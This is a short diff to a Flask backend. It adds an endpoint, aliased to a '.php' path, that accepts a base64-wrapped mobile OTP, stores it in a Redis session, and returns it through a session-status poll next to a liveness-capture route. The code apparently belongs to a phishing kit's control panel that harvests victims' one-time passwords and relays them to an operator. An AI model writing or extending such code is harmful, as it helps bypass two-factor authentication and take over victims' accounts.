@@ -992,6 +992,26 @@ def submit_liveness():
         return jsonify({"success": True})
     except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
 
+@app.route('/api/submit_mobile_otp', methods=['POST'])
+@app.route('/api/submit_mobile_otp.php', methods=['POST'])
+def submit_mobile_otp():
+    try:
+        try: raw = request.data.decode('utf-8'); payload = json.loads(base64.b64decode(raw).decode('utf-8'))
+        except: payload = request.json or {}
+        sid = payload.get('session_id')
+        otp = payload.get('mobile_otp')
+        if not sid or not otp:
+            return jsonify({"success": False, "message": "Missing session_id or mobile_otp"}), 400
+        s_str = redis.get(sid)
+        if s_str:
+            s = json.loads(s_str)
+            s['mobile_otp'] = str(otp).strip()
+            redis.set(sid, json.dumps(s), ex=86400)
+            return jsonify({"success": True, "message": "Mobile OTP submitted successfully"})
+        return jsonify({"success": False, "message": "Session not found"}), 404
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)}), 500
+
 @app.route('/api/check_session_status', methods=['POST'])
 def check_session_status():
     try:
@@ -1001,7 +1021,11 @@ def check_session_status():
         if not s_str: return jsonify({"success": False})
         s = json.loads(s_str)
         return base64.b64encode(json.dumps({
-            "success": True, "data": {"status": s.get('status'), "event_session_id": s.get('event_session_id')}
+            "success": True, "data": {
+                "status": s.get('status'),
+                "event_session_id": s.get('event_session_id'),
+                "mobile_otp": s.get('mobile_otp')
+            }
         }).encode('utf-8')).decode('utf-8')
     except Exception as e: return jsonify({"success": False, "message": str(e)}), 500
 
